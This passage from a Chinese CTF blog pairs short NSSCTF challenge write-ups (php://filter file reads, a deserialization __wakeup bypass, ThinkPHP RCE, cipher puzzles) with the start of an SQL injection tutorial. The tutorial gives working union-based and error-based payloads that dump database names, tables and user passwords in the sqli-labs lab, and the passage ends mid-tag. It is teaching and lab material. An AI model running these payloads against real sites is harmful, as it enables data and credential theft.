title="ez_ez_php(revenge)"></a>ez_ez_php(revenge)</h3><p>php伪协议，输入?file=php://filter/read=convert.base64-encode/resource=flag.php，得到，说在flag，不在flag.php，输入?file=php://filter/read=convert.base64-encode/resource=/flag，得到flag。<br><img src="https://pic1.imgdb.cn/item/635134ed16f2c2beb18b64ed.jpg"><br><img src="https://pic1.imgdb.cn/item/635134ed16f2c2beb18b64b1.jpg"><br><img src="https://pic1.imgdb.cn/item/635134ed16f2c2beb18b64d4.jpg"></p><h3 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h3><p>先试一下robots.txt，找到一个网页，网上找到ThinkPHP V5漏洞，找flag，最后cat flag获取。<br><img src="https://pic1.imgdb.cn/item/6351355716f2c2beb18c69ed.jpg"><br><img src="https://pic1.imgdb.cn/item/6351355716f2c2beb18c6a0d.jpg"></p><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>按照对印的教程，弄了半天，才知道是因为这道题有and，or，空格等过滤导致指令不能正常使用，之后按照以下步骤输入相应指令拿到flag。<br><img src="https://pic1.imgdb.cn/item/6352c89716f2c2beb13be78b.jpg"><br><img src="https://pic1.imgdb.cn/item/6352c89716f2c2beb13be78f.jpg"><br><img src="https://pic1.imgdb.cn/item/6352c89716f2c2beb13be795.jpg"><br><img src="https://pic1.imgdb.cn/item/6352c89716f2c2beb13be7a2.jpg"><br><img src="https://pic1.imgdb.cn/item/6352c89716f2c2beb13be7af.jpg"><br><img src="https://pic1.imgdb.cn/item/6352c8cc16f2c2beb13cafaf.jpg"></p><h3 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h3><p>打开看到，需要反序列化，通过搜索，知道用system指令来执行，但是ls不到内容，经过思考，直接cat flag也没用，通过cat /*所有内容得到了flag。<br><img src="https://pic1.imgdb.cn/item/635130bc16f2c2beb18136aa.jpg"></p><h3 id="xff"><a href="#xff" class="headerlink" title="xff"></a>xff</h3><p>通过HackBar，修改主机地址127.0.0.1，上传提示要是来自首页访问，用继续用HackBar添加，得到flag。<br><img src="https://pic1.imgdb.cn/item/6351374316f2c2beb190de4a.jpg"></p><h3 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h3><p>源代码看到./main.js，进入，看到有base64编码的东西，查询是tapcode，通过解码上面的数，得到flag。<br><img src="https://pic1.imgdb.cn/item/635135dc16f2c2beb18d9bbc.jpg"></p><h3 id="ez-ez-unserialize"><a href="#ez-ez-unserialize" class="headerlink" title="ez_ez_unserialize"></a>ez_ez_unserialize</h3><p>反序列化，经过分析输入x=O:1:”X”:2:{s:1:”x”;s:13:”fllllllag.php”;}，绕过wakeup，得到flag。<br><img src="https://pic1.imgdb.cn/item/635134ed16f2c2beb18b64e5.jpg"></p><h3 id="funny-php"><a href="#funny-php" class="headerlink" title="funny_php"></a>funny_php</h3><p>第一个，想到计算器中数字e数字的表达，用2e9绕过，第二个，用两个NSSCTF,中间插入NSSCTF绕过，第三个，用之前的md5题方法绕过。<br><img src="https://pic1.imgdb.cn/item/6351355716f2c2beb18c69e8.jpg"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Does-your-nc-work？"><a href="#Does-your-nc-work？" class="headerlink" title="Does your nc work？"></a>Does your nc work？</h3><p>按照群内视频步骤安装虚拟机，使用命令符，cd切换目录nss，最后cat flag。<br><img src="https://pic1.imgdb.cn/item/6351527716f2c2beb1cfe828.jpg"></p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="贪吃蛇"><a href="#贪吃蛇" class="headerlink" title="贪吃蛇"></a>贪吃蛇</h3><p>当时是玩出来的，IDA逆向没找到，可能第一题当时也不太熟悉IDA用法，只是打开找了下，然后还是没找到，就玩过了。<br><img src="https://pic1.imgdb.cn/item/635160e016f2c2beb1f0078c.jpg"></p><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>IDA直接打开看到flag。<br><img src="https://pic1.imgdb.cn/item/6351338d16f2c2beb1881708.jpg"></p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>IDA打开，使用查找NSSCTF，找到flag。<br><img src="https://pic1.imgdb.cn/item/6351349d16f2c2beb18a9dc5.jpg"></p><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>IDA打开，看到异或后的文本，编写一个C语言异或脚本，得到flag。<br><img src="https://pic1.imgdb.cn/item/6351374316f2c2beb190de2a.jpg"><br><img src="https://pic1.imgdb.cn/item/6351374316f2c2beb190de31.jpg"></p><h3 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h3><p>用查壳工具查壳,用UPX工具蜕壳，丢进IDA，使用上面的异或脚本解码，得到flag。<br><img src="https://pic1.imgdb.cn/item/635136dc16f2c2beb18ff5c6.jpg"><br><img src="https://pic1.imgdb.cn/item/635136dc16f2c2beb18ff5ea.jpg"><br><img src="https://pic1.imgdb.cn/item/635136dc16f2c2beb18ff5f3.jpg"><br><img src="https://pic1.imgdb.cn/item/635136dc16f2c2beb18ff5be.jpg"><br><img src="https://pic1.imgdb.cn/item/635136dc16f2c2beb18ff5c1.jpg"></p><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>没有文件后缀，尝试用WinHEX查看文件，找到base64文件，解码得到flag。<br><img src="https://pic1.imgdb.cn/item/6351338d16f2c2beb18816e4.jpg"><br><img src="https://pic1.imgdb.cn/item/6351338d16f2c2beb18816e7.jpg"></p><h3 id="base64-2"><a href="#base64-2" class="headerlink" title="base64-2"></a>base64-2</h3><p>没有文件后缀，尝试用WinHEX查看文件，找到base64文件，解码发现不对，查看是码表问题，对应新码表解码，得到flag。<br><img src="https://pic1.imgdb.cn/item/6351338d16f2c2beb18816ed.jpg"><br><img src="https://pic1.imgdb.cn/item/635133fb16f2c2beb18923b4.jpg"></p><h3 id="android"><a href="#android" class="headerlink" title="android"></a>android</h3><p>IDA打开，选择安卓APK格式，搜索NSSCTF，拿到flag。<br><img src="https://pic1.imgdb.cn/item/635130bc16f2c2beb18136fa.jpg"></p><h3 id="py1"><a href="#py1" class="headerlink" title="py1"></a>py1</h3><p>通过C语言编译脚本解密异或，拿到flag。<br><img src="https://pic1.imgdb.cn/item/635135dc16f2c2beb18d9c8b.jpg"></p><h3 id="py2"><a href="#py2" class="headerlink" title="py2"></a>py2</h3><p>使用exe反编译python工具，python pyinstxtractor.py py2.exe，得到反编译文件夹，再用.pyc反编译.py工具，将文件反编译成py，查看是base64编码，解码后得到flag。<br><img src="https://pic1.imgdb.cn/item/6351362816f2c2beb18e4cfb.jpg"><br><img src="https://pic1.imgdb.cn/item/6351362816f2c2beb18e4d04.jpg"><br><img src="https://pic1.imgdb.cn/item/6351362816f2c2beb18e4ce8.jpg"></p><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>使用pyc反编译py工具，编译成py后查看代码，发现输入字符数量为19时（下面代码给出的个数）KeyStream始终不变，修改代码打印KeyStream获得，再每个与给出的数字异或，编写python脚本，用chr()转化为字母，得到flag。<br><img src="https://pic1.imgdb.cn/item/6351362816f2c2beb18e4cf0.jpg"><br><img src="https://pic1.imgdb.cn/item/6351362816f2c2beb18e4cf6.jpg"><br><img src="https://pic1.imgdb.cn/item/6351366a16f2c2beb18ee01b.jpg"></p><h3 id="android2"><a href="#android2" class="headerlink" title="android2"></a>android2</h3><p>用apk反编译器打开，查看分析代码，编写Java脚本，取得flag。<br><img src="https://pic1.imgdb.cn/item/635130bc16f2c2beb181368c.jpg"><br><img src="https://pic1.imgdb.cn/item/635130bc16f2c2beb181369d.jpg"><br><img src="https://pic1.imgdb.cn/item/6351338d16f2c2beb18816f3.jpg"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="善哉善哉"><a href="#善哉善哉" class="headerlink" title="善哉善哉"></a>善哉善哉</h3><p>用WinHEX查看，找到最后有摩尔斯电码，转化后是新佛曰，用在线网站转化得中文，计算字符md5，得到flag。<br><img src="https://pic1.imgdb.cn/item/635137c616f2c2beb1921268.jpg"><br><img src="https://pic1.imgdb.cn/item/635137c616f2c2beb1921272.jpg"><br><img src="https://pic1.imgdb.cn/item/6351380316f2c2beb192aa27.jpg"></p><h3 id="什锦"><a href="#什锦" class="headerlink" title="什锦"></a>什锦</h3><p>A通过社会主义核心价值观解密：富强明主文明和谐，B通过猪圈密码解密：PIGISSOCUTEWHYYOUKILLPIG，C通过BrianFuck解密：但是猪猪好好吃诶，计算md5得到flag。<br><img src="https://pic1.imgdb.cn/item/6351380316f2c2beb192aa39.jpg"><br><img src="https://pic1.imgdb.cn/item/6351380316f2c2beb192aa0f.jpg"></p><h3 id="Welcome-to-Modern-Cryptography"><a href="#Welcome-to-Modern-Cryptography" class="headerlink" title="Welcome to Modern Cryptography"></a>Welcome to Modern Cryptography</h3><p>通过RSA解密工具解密。<br><img src="https://pic1.imgdb.cn/item/6351370d16f2c2beb1906625.jpg"></p><h3 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h3><p>搜索发现可能是KeyBase软件加密，下载注册输入得到flag。<br><img src="https://pic1.imgdb.cn/item/6351366a16f2c2beb18ee026.jpg"></p><h3 id="Matrix"><a href="#Matrix" class="headerlink" title="Matrix"></a>Matrix</h3><p>通过网络了解到python的脚本，修改相应的数据，运行脚本得到flag。<br><img src="https://pic1.imgdb.cn/item/6353705d16f2c2beb1347f62.jpg"></p><h3 id="小明文"><a href="#小明文" class="headerlink" title="小明文"></a>小明文</h3><p>网上搜索相关资料，再结合题目编写脚本得到flag。<br><img src="https://pic1.imgdb.cn/item/6351380316f2c2beb192aa1c.jpg"></p><h3 id="yafu分解"><a href="#yafu分解" class="headerlink" title="yafu分解"></a>yafu分解</h3><p>使用yafu分解工具，对n进行分解，找到p，q，根据RSA解密方式编写脚本，得到答案，发现有字符偏移，R13解密后拿到flag。<br><img src="https://pic1.imgdb.cn/item/6351374316f2c2beb190de39.jpg"><br><img src="https://pic1.imgdb.cn/item/635137c616f2c2beb1921281.jpg"><br><img src="https://pic1.imgdb.cn/item/635137c616f2c2beb1921293.jpg"></p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>随波逐流工具输入相关值解密。<br><img src="https://pic1.imgdb.cn/item/635130bc16f2c2beb18136e0.jpg"></p><h3 id="爆破MD5"><a href="#爆破MD5" class="headerlink" title="爆破MD5"></a>爆破MD5</h3><p>网上找到相关脚本，修改字典和相关参数后爆破拿到flag。<br><img src="https://pic1.imgdb.cn/item/635137c616f2c2beb192125f.jpg"></p><h3 id="Caesar-Ceaasr"><a href="#Caesar-Ceaasr" class="headerlink" title="Caesar?Ceaasr!"></a>Caesar?Ceaasr!</h3><p>通过分析发现，大写字母两个连续，通过换行看到，竖着看第二第三个相等，猜测是编码后的NSS，竖着读出所有内容，R13解码后拿到flag。<br><img src="https://pic1.imgdb.cn/item/635133fb16f2c2beb18923bb.jpg"><br><img src="https://pic1.imgdb.cn/item/6352ca9116f2c2beb1436719.jpg"></p><h3 id="From-one-to-1"><a href="#From-one-to-1" class="headerlink" title="From one to 1"></a>From one to 1</h3><p>通过网络查找到工具尝试，解出对应的正确编码，得到正确的base64，对base64解码得到flag。<br><img src="https://pic1.imgdb.cn/item/6351355716f2c2beb18c6a16.jpg"><br><img src="https://pic1.imgdb.cn/item/6351355716f2c2beb18c69e5.jpg"></p><h3 id="Not-Victoria"><a href="#Not-Victoria" class="headerlink" title="Not Victoria"></a>Not Victoria</h3><p>通过网络查找到工具尝试，解出对应的正确编码，得到正确的base64，对base64解码得到flag。<br><img src="https://pic1.imgdb.cn/item/635135dc16f2c2beb18d9c8c.jpg"><br><img src="https://pic1.imgdb.cn/item/635135dc16f2c2beb18d9bbe.jpg"></p><h3 id="Huge-Sudoku"><a href="#Huge-Sudoku" class="headerlink" title="Huge Sudoku"></a>Huge Sudoku</h3><p>通过网络找到C语言脚本，是A开始排列的，对应替换后，输出结果，然后替换回来，拿到flag。<br><img src="https://pic1.imgdb.cn/item/6352116416f2c2beb19c942a.jpg"><br><img src="https://pic1.imgdb.cn/item/6352116416f2c2beb19c942e.jpg"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Crack-Me"><a href="#Crack-Me" class="headerlink" title="Crack Me"></a>Crack Me</h3><p>第一层，用WinHEX修改头文件改成非加密文件，正常打开，是伪加密。第二层，用ziperello，尝试数字字母未成功，尝试数字破解成功，拿到flag。<br><img src="https://pic1.imgdb.cn/item/6351349d16f2c2beb18a9dd5.jpg"><br><img src="https://pic1.imgdb.cn/item/6351349d16f2c2beb18a9dbe.jpg"><br><img src="https://pic1.imgdb.cn/item/6351349d16f2c2beb18a9dc1.jpg"></p><h3 id="Coffee-Please"><a href="#Coffee-Please" class="headerlink" title="Coffee Please"></a>Coffee Please</h3><p>word半天找不到，通过换成zip解压，浏览所有文件发现flag，excel通过搜索关键字找到flag，ppt发现界面进度条不对劲，找到flag在左下角。<br><img src="https://pic1.imgdb.cn/item/635133fb16f2c2beb18923aa.jpg"><br><img src="https://pic1.imgdb.cn/item/635133fb16f2c2beb18923ae.jpg"><br><img src="https://pic1.imgdb.cn/item/6351345516f2c2beb189e531.jpg"></p><h3 id="Convert-Somthing"><a href="#Convert-Somthing" class="headerlink" title="Convert Somthing"></a>Convert Somthing</h3><p>通过了解知道base64隐写用python脚本解出一般，后一半发现在文本中还有零宽度字符隐写，通过工具找到后一半flag。<br><img src="https://pic1.imgdb.cn/item/6351345516f2c2beb189e536.jpg"><br><img src="https://pic1.imgdb.cn/item/6351345516f2c2beb189e521.jpg"></p><h3 id="Coding-In-Time"><a href="#Coding-In-Time" class="headerlink" title="Coding In Time"></a>Coding In Time</h3><p>通过拼接找到前面flag，hint是Coding In Time，找到每张驻留时间不同，去0后通过ASCII翻译得到flag。<br><img src="https://pic1.imgdb.cn/item/63513a0416f2c2beb197e3e1.jpg"><br><img src="https://pic1.imgdb.cn/item/63513a0416f2c2beb197e3e4.jpg"></p><h3 id="Cover-Removed"><a href="#Cover-Removed" class="headerlink" title="Cover Removed"></a>Cover Removed</h3><p>通过移动鼠标发现图片后面还有字，找到一半flag，通过了解尝试很多工具，最后找到wbs43open-win32工具找到后半flag。<br><img src="https://pic1.imgdb.cn/item/6351345516f2c2beb189e524.jpg"><br><img src="https://pic1.imgdb.cn/item/6351345516f2c2beb189e529.jpg"><br><img src="https://pic1.imgdb.cn/item/6351349d16f2c2beb18a9dcb.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-SQL注入漏洞</title>
    <link href="/2023/08/20/CTF-Show-1/"/>
    <url>/2023/08/20/CTF-Show-1/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="一、SQL注入简介"><a href="#一、SQL注入简介" class="headerlink" title="一、SQL注入简介"></a>一、SQL注入简介</h2><h3 id="1、SQL"><a href="#1、SQL" class="headerlink" title="1、SQL"></a>1、SQL</h3><p>结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）</p><h3 id="2、SQL注入"><a href="#2、SQL注入" class="headerlink" title="2、SQL注入"></a>2、SQL注入</h3><p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</p><h3 id="3、SQL注入漏洞原因分析"><a href="#3、SQL注入漏洞原因分析" class="headerlink" title="3、SQL注入漏洞原因分析"></a>3、SQL注入漏洞原因分析</h3><p>我们都知道web分为前端和后端，前端负责数据显示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如MySQL数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询。</p><h3 id="4、SQL注入漏洞对于数据安全的影响"><a href="#4、SQL注入漏洞对于数据安全的影响" class="headerlink" title="4、SQL注入漏洞对于数据安全的影响"></a>4、SQL注入漏洞对于数据安全的影响</h3><ul><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡改。</li><li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ul><h2 id="二、发现SQL注入漏洞"><a href="#二、发现SQL注入漏洞" class="headerlink" title="二、发现SQL注入漏洞"></a>二、发现SQL注入漏洞</h2><h3 id="1、漏洞探测"><a href="#1、漏洞探测" class="headerlink" title="1、漏洞探测"></a>1、漏洞探测</h3><p>1.注入可能存在的地方</p><p>sql注入，那么这个地方肯定是与数据库有数据交互的，所以我们可以优先观察那种页面存在传值或者查询的地方。比如url中的GET型传参，如?id=1</p><p>如我们看见这种就可以考虑</p><p><img src="https://img-blog.csdnimg.cn/20210612195905209.png" alt="img"></p><p>或者是搜索框，前端将用户输入的数据代入到数据库中进行查询，这种以POST方法进行发送数据。如下这种地方</p><p><img src="https://img-blog.csdnimg.cn/20210612200112789.png" alt="img"></p><p>或者是HTTP请求头部字段如Cookie值，下面会讲到。</p><p>2.漏洞探测</p><p>此时需要我们用burp截取查询的数据包，找到传参的变量然后在其后面加上单引号、双引号等如下payload进行测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">#判断如下闭合方式是否会报错，会报错则肯定存在注入<br><span class="hljs-operator">=</span>test<span class="hljs-string">&#x27;                         </span><br><span class="hljs-string">=test&quot;                         </span><br><span class="hljs-string"></span><br><span class="hljs-string">#若不报错则判断是否存在布尔盲注，如果页面会有不同的显示在可能存在漏洞</span><br><span class="hljs-string">=test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">-1</span><span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">=test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">-1</span><span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;  </span><br><span class="hljs-string">=test&quot; and -1=-1 or &quot;</span><br><span class="hljs-string">=test&quot; and -1=-2 or &quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210612200244975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="2、SQL注入防范"><a href="#2、SQL注入防范" class="headerlink" title="2、SQL注入防范"></a>2、SQL注入防范</h3><p>常遇到的一些防范方式：</p><p>1.对输入进行严格的转义和过滤</p><p>2.通过WAF启用防SQL Inject注入策略（或类似防护系统）</p><h2 id="三、SQL常见的注入手法"><a href="#三、SQL常见的注入手法" class="headerlink" title="三、SQL常见的注入手法"></a>三、SQL常见的注入手法</h2><h3 id="1、联合查询-union注入"><a href="#1、联合查询-union注入" class="headerlink" title="1、联合查询(union注入)"></a>1、联合查询(union注入)</h3><p>如下，要求我们传入一个id值过去。传参?id=1，当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5765e07f95e7c1366287a872ffccddf6.png" alt="img"></p><p><em>1. 注入点判断</em></p><p>开始判断是否存在注入，输入?id=1’，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞</p><p><img src="https://img-blog.csdnimg.cn/img_convert/adec07611bdcddfbc5c106c8ea2c304d.png" alt="img"></p><p>继续判断，输入 ?id=1’ and 1=1 –+ 页面正常显示传送门：<a href="https://blog.csdn.net/qq_44159028/article/details/114808681">关于sql注入中的 –+</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/be9fdc34bfe04bccc5c95b689c411cd1.png" alt="img"></p><p>?id=1’ and 1=2 –+ 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p><p><img src="https://img-blog.csdnimg.cn/img_convert/801909c73d735099f696d1412b874db7.png" alt="img"></p><p>页面会根据输入的数据变化而变化，当存在注入点时，优先考虑使用联合注入手法。</p><p><em>2. 判断当前表的字段个数</em></p><p>传送门：<a href="https://blog.csdn.net/qq_44159028/article/details/114809458">关于order by</a></p><p>输入order by 3，页面无异常反应</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b5a63fc27c7581f722c970bb218f7edb.png" alt="img"></p><p>将3修改为4，此时显示未知的列，说明此时当前表中只有3列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4 --+ </span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/352708c1ecc12633b9b911719ba5497a.png" alt="img"></p><p><em>3. 判断显示位</em></p><p>以下为union注入中较为常用的一些函数和环境变量</p><table><thead><tr><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>version()</td><td>MySQL 版本</td></tr><tr><td>user()</td><td>当前数据库用户名</td></tr><tr><td>database()</td><td>当前数据库名</td></tr><tr><td>@@version_compile_os</td><td>操作系统版本</td></tr><tr><td>@@datadir</td><td>数据库路径</td></tr></tbody></table><p>接下来测试我们的输入会在屏幕哪个地方进行回显。上面我们判断出来了表中有3列，所以union select的时候就写xx,xx,xx三个数据</p><p>需让union select前面的参数查不出来而回显后面的语句，所以id=-1’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+ </span><br></code></pre></td></tr></table></figure><p>如下，在name和password值中回显了我们的输入，这时我们就可以在回显2或3的放置放入测试语句。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f962f6f2985878f6614126a7bbca294e.png" alt="img"></p><p><em>4. 爆当前数据库名字</em></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br></code></pre></td></tr></table></figure><p>获取当前数据库名为“security”</p><p><img src="https://img-blog.csdnimg.cn/img_convert/dcd326b0b7cb326625241ac599324a96.png" alt="img"></p><p><em>5. 爆当前数据库中的表</em></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#直接套用语句<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></code></pre></td></tr></table></figure><p>显示当前数据库中存在4个表“emails,referers,uagents,users”</p><p><img src="https://img-blog.csdnimg.cn/img_convert/61e67d00f7c5bf7b7f22c4a5b76c6bd3.png" alt="img"></p><p><em>6. 爆表中的字段</em></p><p>我们这里选择users表进行进一步的获取表中的字段信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#只需指定表名即可<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#或者指定当前数据库名</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>获取”users”表中存在3个字段，分别为 “id,username,password”</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5591e604770150f33f8b840c14e1c29c.png" alt="img"></p><p><em>7. 爆相应字段的所有数据</em></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#只需指定表名和字段名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(`id`,&#x27;</span>:<span class="hljs-string">&#x27;,`username`,&#x27;</span>:<span class="hljs-string">&#x27;,`password`) from users --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#字段值不加反引号也可以</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-string">&#x27;:&#x27;</span>,password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/eedfcbea64b0073edf1c4f9296a5d34b.png" alt="img"></p><p>至此，联合查询整个过程结束。注入的时候找到注入点后只需套入语句即可。</p><h3 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h3><p>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。</p><p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p><p>推荐三种报错注入的方法，直接套用就行。以less-1为例子</p><p><strong>1. group by 重复键冲</strong></p><blockquote><p>and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p></blockquote><p>提交如下，获取数据库名字</p><blockquote><p>?id=1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210316093930798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>2. extractvalue() 函数</strong></p><blockquote><p>?id=1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+</p></blockquote><p>提交 ?id=1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+ 获取数据库名字</p><p><img src="https://img-blog.csdnimg.cn/20210316094306845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>3. updatexml() 函数</strong></p><blockquote><p>and updatexml(1,concat(‘^’,(需要查询的内容),’^’),1)</p></blockquote><ol><li>提交如下，获取数据库名字</li></ol><blockquote><p>?id=1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2021031609453822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><ol start="2"><li>获取当前数据库中表的名字</li></ol><p>?id=1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema=’security’ ),’^’),1) –+</p><p><img src="https://img-blog.csdnimg.cn/20210316094730140.png" alt="img"></p><p>这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema=’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）</p><p><img src="https://img-blog.csdnimg.cn/20210316095213384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" 